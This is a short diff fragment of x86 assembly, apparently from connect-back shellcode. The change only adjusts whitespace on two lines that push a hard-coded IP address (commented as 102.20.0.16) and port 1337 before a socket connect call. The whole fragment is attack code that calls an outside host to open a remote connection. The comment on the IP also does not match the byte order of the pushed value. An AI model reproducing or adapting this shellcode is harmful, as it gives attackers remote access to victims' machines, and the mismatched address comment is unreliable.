@@ -39,8 +39,8 @@ add	esp, 12
 
 connect:
 xchg	edi, eax
-push	dword 0x66140010	;IP 102.20.0.16
-push	word 0x3905	;port: 1337
+push	dword 0x66140010  ;IP 102.20.0.16
+push	word 0x3905	  ;port: 1337
 inc	ebx
 push	bx
 mov	ecx, esp
